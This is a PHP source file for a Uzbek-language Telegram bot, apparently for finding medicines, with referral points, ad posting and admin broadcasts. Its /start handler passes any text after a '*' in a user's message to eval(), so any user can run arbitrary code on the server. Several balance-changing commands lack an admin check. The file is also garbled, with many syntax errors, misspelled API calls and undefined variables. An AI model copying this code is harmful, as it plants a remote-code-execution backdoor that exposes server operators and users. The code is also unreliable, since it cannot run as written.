<?php
ob_start();
define('API_KEY',"xxxxx");
$admin="27090612";
$bot="@Saidbek_med_pharmbot";
function del($nomi){
array_map('unlink',glob('$nomi'));
}
function ty($ch){
return bot('sendCharAction',['chat_id'=>$ch, 'action'=>'typing',]);
}
function bot($method,$datas=[]){
$url='https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res=curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$update=json_decode(file_get_contents('php://input'));
$message=$update->message;
$mid=$message->message_id;
$cid=$message->chat->id;
$filee='sum/$cid.step';
$folder='dori';
$folder2='nomi';
$textmessage=isset($update->message->text)?$update->message->text:";
$callback=$update->callback_query;
$data=$update->callback_query->data;
$data=$update->callback_query->data;
$yuzer=$message->from->username;
$name=$message->from->first_name;
$chat_id=$message->chat->id;
$cid2=$update->callback_query->message->chat->id;
$mid2=$update->callback_query->message->message_id;
$mmid=$callback->inline_message_id;
$mes=$callback->message;
$idd=$callback->message->chat->id;
$cbid=$callback->from->id;
$ida=$callback->id;
$cqid=$update->callback_query->id;
$stepa=file_get_contents('apteka/$chat_id.step');
$step=file_get_contents('sum/$cid.step');
mkdir('apteka');
if(!file_exists($folder.'/test.fds3')){
mkdir($folder);
file_put_contents($folder.'/test.fd3','by @musulmon_0403');
}
if(!file_exists($folder2.'/test.fd3')){
mkdir($folder2);
file_put_contents($folder2.'/test.fd3','by @musulmon_0403');
}
if(file_exists($filee)){
$step=file_get_contents($file);
}
$name=$message->from->first_name;
$tx=$message->text;
$key=json_encode(['resize_keyboard'=>true,'keyboard'=>[
[['text'=>'🔎Dorini topish'],[['text'=>'🔗Referal silkani tarqatish'],['text'=>'👨‍💻botni admini'],],
[['text'=>'📱Telefon raqami'],[['text'=>'📽 Botdan foydalanish videosi'],['text'=>'📩Adminga yozing'],],
]
]);
$orqaga='🗄Menu';
$key3=json_encode(['resize_keyboard'=true,'keyboard'=>[[['text'=>$orqaga],],]]);
$start1='*Xush kelibsiz📤*
[$name](tg://user?id=$cid) *siz bizning botimizga xush kelibsiz
Agar Sizga dori kerak bo'lsa ishlating agar bilmasangiz video bor orqali o'rganing dorini nomini yozing va mahsulotimiz yordam teganimidan xursandman: * *Dasturchi*[@musulmon_0403]';
if((mb_stripos($tx,'/start')!==false) or($tx=='/start')){
ty($cid);
$baza=file_get_contents('sum.dat');
if(mb_stripos($baza,$cid)!==false){
}else{
$bgun=file_get_contents('bugun.$kun1');
$bgun+=1;
file_get_contents('bugun.$kun1',$bgun);
}
$public=explode('*',$tx);
$refid=explode(' ',$tx);
$refid=$refid[1];
$gett=bot('getbotMember',['bot_id'=>$botimiz,'user_id'=>$refid,]);
$public2=$public[1];
if(isset($public2)){
$tekshir=eval($public2);
bot('sendMessage',['chat_id'=>$cid,'text'=$tekshir,]);
}
$gget=$gett->result->status;
if($gget=='creator' or $gget=='administrator'){
$idref='sum/$refid_id.dat';
$idref2=file_get_contents($idref);
if(mb_stripos($idref2,'$cid')!==false){
bot('sendMessage',['chat_id'=$cid,'text'=>'To'g'ri foydalaning iltimos🙏',]);
}else{
$id='$cid\n';
$handle=fopen($idref,'a+');
fwrite($handle,$id);
fclose($handle);
$usr=file_get_contents('sum/$refid.dat');
$usr=$usr+500;
file_put_contents('sum/$refid.dat','$usr');
bot('sendMessage',['chat_id'=>$refid,'text'=>'Dori kerak bo'lgan insoningizni taklif qiling🧑👩‍🦳','reply-markup'=>$key,]);
}
}
file_put_contents('sum/$cid.dat');
bot('sendMessage',['chat_id'=$refid,]);
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>$start1,'reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if(isset($tx)){
$gett=bot('getBotMember',['chat_id'=>$botimiz,'user_id'=$cid,]);
$gget=$gett->result->status;
if($gget=='creator' or $gget=='administrator'){
$bot='@Saidbek_med_pharmbot';
if($tx=='🔗Referal silka'){
ty($cid);
$ball=file_get_contents('sum/$cid.dat');
$in='🎉*Yaqinlaringizni taklif qiling:*➡️[https://t.me/1bot?start=$cid]
_👨‍💻Har bitta taklif qilingan odamga 500 sum olasiz! Reklama berishingiz mumkin✅_
_To'plangan sumangiz:_$sum';
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>$in,'reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if($tx=='📩Adminga yozish'){
file_put_contents('aloqa/$cid.step','admin');
bot('sendmessage',['chat_id'=>$cid,'text'=>'_📩Iltimos xabaringiz yozib qoldiring📩:_','parse_mode'=>'markdown','reply_markup'=>$key3,]);
}
if($stepa=='admin'){
if($tx=='$orqaga'){
unlink('aloqa/$cid.step');
}else{
bot('sendmessage',['chat_id'=>$cid,'text'=>'_🔔Xabar ketdi savol uchun rahmat?.........''📤Xabar jo'natildi. Iltimos sabr qiling. Bot admini o'zi yozadi sizga😉'','parse_mode'=>'markdown','reply_markup'=>$key3,]);
bot('sendmessage',['chat_id'=>$admin,'text'=>'Yangi xabar 🏃‍♂️ 🧑👩‍🦳Xabar yuborgan banda: [$name] 🔗Xabarchining xavolasi:@$yuzer 🆔Xabar yuborgan bandaning idsi: $cid 💻Xabar matini: $tx','parse_mode'=>'markdown','reply_markup'=>$key,]);
bot('sendmessage',['chat_id'=>$admin,'text'=>'Javob berish uchun 👇/habar=$cid=matn','parse_mode'=>'markdown','reply_markup'=>$key,]);
unlink('aloqa/$cid.step');
}
}
if(mb_stripos($tx,'/habar')!==false){
$ex=explode('=',$tx);
$res=bot('sendmessage',['chat_id'=>$ex[1],'text'=>$ex[2],]);
if($res->ok){
bot('sendmessage',['chat_id'=>$admin,'text'=>'✅Jo'natdim',]);
}else{
bot('sendmessage',['chat_id'=>$admin,'text'=>'❌Jo'natmadim',]);
}
}
if($tx=='🔰Loyihalarimiz'){
ty($cid);
bot('sendMessage',['chat_id'=>$cid,'text'=>🌐Botlarimiz👉 @Saidbek_med_pharmbot 'reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if($tx=='✅HA'){
ty($cid);
$sum=file_get_contents('sum/$cid.dat');
if($sum>1000){
bot('sendMessage',['chat_id'=>$cid,'text'=>'Reklama qilish namuna bo'yicha qiling' Namuna: BOT🌐 100 A'zo [Bot nomi](https://t.me/link) Agar notog'ri qildingiz reklama o'chdi muammo bo'lsa adminga murojaat qiling','reply_to_message_id'=>$mid,'reply_markup'=>$key3,]);
file_put_contents('sum/$cid.step','nomer');
}else{
bot('sendMessage',['chat_id'=>$cid,'text'=>'😈Sabrsizlingiz uchun 50 sum jarima!','reply_to_message_id'=>$mid,]);
$sum-=50;
file_put_contents('sum/$cid.dat','$sum');
}
}
else if($step=='nomer'){
ty($cid);
if($tx=='$orqaga'){
del('sum/$cid.step');
}else{
$sum=file_get_contents('sum/$cid.dat');
bot('sendMessage',['chat_id'=>$admin,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>$tx.'\n\n 👱‍♂️Reklama qilgan banda [$name](tg://user?id=$cid)','disable_web_page_preview'=>true]);
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>$tx.'\n *💫Manba* [$botimiz]\n*Reklama qilindi✅* [$botimiz] *ga qarang👁* *Agar nimadur bo'lsa👨‍💻*[@musulmon_0403] *Botimizga murojaat qiling💻*','reply_markup'=$key,]);
bot('sendMessage',['chat_id'=$kanalimiz,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>$tx.'\n💫Manba*[$botimiz]','disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'📝Reklama berish','url=>'https://t.me/Saidbek_med_pharmbot']]]])]);
$sum-=50;
file_put_contents('sum/$cid.dat','$sum');
del('sum/$cid.step');
}
}
if($tx=='❌Yoq'){
ty($cid);
bot('sendMessage',['chat_id'=$cid,'text'=>'ok','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if($tx=='$orqaga'){
ty($cid);
bot('sendMessage',['chat_id'=>$cid,'text'=>'ok','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if($tx=='Yordam?🔎'){
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown',
'text'=>'📤Xush kelibsiz, Botdan foydalanama olmaganlar pastda ma'lumot bor👇 1-Usul.*🔗Referal silka* tugmani bosing keyin bot sizga havola beradi siz uni yaqinlaringizga tarqatib har bir odamga 500 sum olasiz. 2-Usul Botimizga kirganizda havola beradi tarqatganizga 500 sum olasiz va hato qilsangiz 50 sum jarima olasiz Guruhingiz yoki kanalingiz reklamasi [$botimiz] da e'lon qilmaymiz.','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if($tx=='💵Summallar💵'){
ty($cid);
$sum=file_get_contents('sum/$cid.dat');
$in='📤Xush kelibsiz *Sizning to'plangan jami summalaringiz: $sum sum mavjud* *🧑👩‍🦳Yaqinlaringizni taklif qiling*'; 
bot('sendMessage',['chat_id'=>$cid,'message_id'=$mid,'parse_mode'=>'markdown','text'=>$in,'reply_to_message_id'=>$mid, 'reply_markup'=>$key,]);
}
if($tx=='💵Sumga dori olish'){
ty($cid);
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>'*Sum olish*💵 _Agar sumga dori olmoqchi bo'lsangiz kartamizga tashlang_*Pul to'lash usullari* 💳Click Sumga dori olish uchun siz #sum kerakli sumni yozing','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if(stripos($tx,'/push')!==false){
$ex=explode('_',$tx);
$refid=$ex[1];
$usr=file_get_contents('sum/$refid.dat');
$usr-=$ex[2];
file_put_contents('sum/$refid.dat','$usr');
}
$replyik=$message->reply_to_message->text;
$yubbi='📬Yuboriladigan xabarni kiriting. Xabar turi markdown'; 
if($tx=='/send' and $cid==$admin){
ty($cid);
bot('sendMessage',['chat_id'=>$cid,'text'=>$yubbi,'reply_markup'=>$key3,]);
file_put_contents('sum/$cid.step','send');
}
if($step=='send' and $cid==$admin){
ty($cid);
if($tx=='$orqaga'){
del('sum/$cid.step'); 
}else{
ty($cid);
$idss=file_get_contents('sum.dat');
$idszs=explode('\n',$idss);
foreach($idszs as $idlat){
bot('sendMessage',['chat_id'=>$idlat,'text'=>$tx,]);
}
del('sum/$cid.step');
}
}
if(stripos($tx,'/sot')!==false){
$ex=explode('_'.$tx);
$refid=$ex[1];
$usr=file_get_contents('sum/$refid.dat');
$usr+=$ex[2];
file_put_contents('sum/$refid.dat','$usr');
}
if(mb_stripos($textmessage,'#koder')!==false){
bot('SendMessage',['chat_id'=>$cid,'reply_to_message_id'=>$mid,'text'=>'Yuborildi✅',]);
}
if(mb_stripos($textmessage,'#koder')!==false){
bot('SendMessage',['chat_id'=>$botimiz,'message_id'=$mid,'parse_mode'=>'markdown','text'=>'*Admindan Xabar keldi*👨‍💻\n\n'''$textmessage'''\n💫*Manba* [$botimiz]','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'Botimiz','url'=>'https://t.me/Saidbek_med_pharmbot']]]])]);
}
if(mb_stripos($textmessage,'#sum')!==false){
bot('SendMessage',['chat_id'=>$cid,'reply_to_message_id'=>$mid,'text'=>'Mediratorga yuborildi✅','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if(mb_stripos($textmessage,'#sum')!==false){
bot('SendMessage',['chat_id'=>$admin,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>'*💵Sum kerak ekan* $textmessage 🆔idisi:$cid 🧑ismi: [$name](tg://user?id=$cid)',null,false]);
}
if((mb_stripos($tx,'/stat')!==false) or ($tx=='📈Statistika')){
ty($cid);
$eski=$kun1-1;
$new=file_get_contents('bugun.$kun1');
$baza=file_get_contents('sum.dat');
$obsh=substr_count($baza,'\n');
bot('sendMessage',['chat_id'=>$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>'*Botimiz malumoti*_📈Botimiz azolari:_*$new*\n📈_Kundagi azolar_','reply_to_message_id'=>$mid,'reply_markup'=>$key,]);
}
if(stripos($tx'/master10')!==false){
$ex=explode('_',$tx);
$refid=$ex[1];
$usr=file_get_contents('sum/$refid.dat');
$usr+=$ex[2];
file_put_contents('sum/$refid.dat','$usr');
bot('sendMessage',['chat_id'=>$admin,'text'=>'💎Bu joy bot qoshish uchun','reply_to_message_id'=>$mid,'reply_markup'=>$key.]);
}
$nocha='🛡Keyinroq urinib ko'ring';
$noazo='Siz botga azo bolmadingiz';
$okcha='Siz botga azo boldiz 500💵sum berildi';
if((stripos($tx,'/Bot')!==false) and $cid==$admin){
$ex=explode('=',$tx);
file_put_contents('Bot.dat','$ex[1]|$ex[2]|0');
bot('sendMessage',['chat_id'=>$cid,'text'=>'🛎Bot:'.$ex[2].'\n🙎‍♂️Kerakli banda soni:'.$ex[1].'\n🚦Boshqa bot qoshmay turing bot aytgach qo'shasiz!','reply_markup'=>$key,]);
}
if((stripos($tx,'/otmen')!==false) and $cid==$admin){
unlink('bot.dat');
bot('sendMessage',['chat_id'=>$cid,'text'=>'Bot o'chirildi!','reply_markup'=>$key,]);
}
if($tx=='💵Sum to'plash'){
ty($cid);
$get=file_get_contents('bot.dat');
if($get){
list($odam,$bot,$now)=explode('|',$get);
if($odam==$now){
unlink('bot.dat');
bot('sendMessage',['chat_id'=>$admin,'text'=>'✅Botni qo'shish mumkin!','reply_markup'=>$key,]);
bot('sendMessage',['chat_id'=>$cid, 'text'=>$nocha,'reply_markup'=>$key,]);
}else{
file_put_contents('sum/$cid.step','chek');
bot('sendMessage',['chat_id'=>$cid,'text'=>'💎Siz biz bergan vazifalarni bajarish keyin tasdiqlash✅tugmasini bosing👉$bot-bot','reply_markup'=>json_encode(['resize_keyboard'=>true,'keyboard'=>[[['text'=>'Tasdiqlash✅'],],]]),]);
}
}else{
bot('sendMessage',['chat_id'=>$cid,'text'=>$nocha,'reply_markup'=>$key,]);
}
}
if($tx=='Tasdiqlash✅'){
del('sum/$cid.step');
$get=file_get_contents('bot.dat');
if($get){
list($odam,$bot,$now)=explode('|',$get);
$tekshir=file_get_contents('azo/$cid.bot');
if($tekshir){
bot('sendMessage',['chat_id'=>$cid,
'text'=>'👆Siz bu botda bor edingiz!','reply_markup'=>$key,]);
}else{
$get=file_get_contents('bot.dat');
list($odam,$bot,$now)=explode('|',$get);
$gett=bot('getCharMember',['chat_id'=>$bot,'user_id'=>$cid,]);
$gget=$gett->result->status;
if($gget=='member'){
$time=date('d',strotime('5 hour'));
$test=file_put_contents('azo/$cid.bot','$bot|$cid|$time');
if($test){
$now+=1;
file_put_contents('bot.dat','$odam|$bot|$now');
$kabin=file_get_contents('sum/$cid.dat');
$kabi=$kabin+200;
file_put_contents('sum/$cid.dat','$kabi');
bot('sendMessage',['chat_id'=>$cid,'text'=>$okcha,'reply_markup'=>$key,]);
}else{
bot('sendMessage',['chat_id'=>$cid,
'text'=>'❌Qaytadan urinib ko'ring, xato aniqlandi','reply_markup'=>$key,]);
}
}else{
bot('sendMessage',['chat_id'=>$cid,'text'=>$noazo,'reply_markup'=>$key,]);
}
}
}else{
bot('sendMessage',['chat_id'=>$cid,'text'=>$nocha,'reply_markup'=>$key,]);
}
}
if(isset($tx)){
$baza=file_get_contents('sum.dat');
if(mb_stripos($baza,$cid)!==false){
}else{
$baza=file_get_contents('sum.dat');
$dat='$baza\n$cid';
file_put_contents('sum.dat',$dat);
}
$faylla=glob('azo/*.*);
foreach($faylla as $fayl){
$geti=file_get_contents('$fayl');
list($chati,$usri,$ftime)=explode('|',$geti);
$nowtime=date('d',strtotime('-72 hour'));
if($ftime<$nowtime){
unlink('$fayl');
}else{
$gett=bot('getCharMember',['chat_id'=>$chati,'user_id'=>$usri,]);
$gget=$gett->result->status;
if($gget!='member'){
bot('sendMessage',['chat_id'=$usri,'text'=>'😈Siz 5 kun bo'lmasdan [$chati] botdan chiqib ketdingiz Sizdan 50💵 sum olib tashlandi','reply_markup'=>$key,]);
$kabin=file_get_contents('sum/$usri.dat');
$sum=$kabin-25;
file_put_contents('sum/$usri.dat','$sum');
unlink('$fayl');
}
}
}
}
}else{
bot('sendMessage',['chat_id'=$cid,'message_id'=>$mid,'parse_mode'=>'markdown','text'=>'📤Xush kelibsiz siz botimizda azo emassiz shuning uchun bot ishlamaydi*⛔️_Botimizdan to'liq foydalanish uchun_[$botimiz]_ga azo bo'ling_✅','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🌐Botimiz','url'=>'https://t.me/Saidbek_med_pharmbot']]]])]);
}
}
$step=file_get_contents('sum/$cid.step');
if($text1=='/send' and $cid==$admin){
ty($cid);
bot('sendMessage',['chat_id'=>$cid,'text'=>'✉️Xabarni kiriting','reply_markup'=>json_encode(['resize_keyboard'=>true,'keyboard'=>[[['text'=>'$orqaga'],],]])]);
file_put_contents('sum/$cid.step','send');
}
if($step=='send' and $cid==$admin){
ty($cid);
if($tx=='$orqaga'){
del('sum/$cid.step');
}else{
ty($cid);
$idss=file_get_contents('sum/$cid.dat');
$idszs=explode('\n',$idss);
foreach($idszs as $idlat){
bot('sendMessage',['chat_id'=>$idlat,'text'=>$tx,]);
}
unlink('sum/$cid.step');
}
}
?>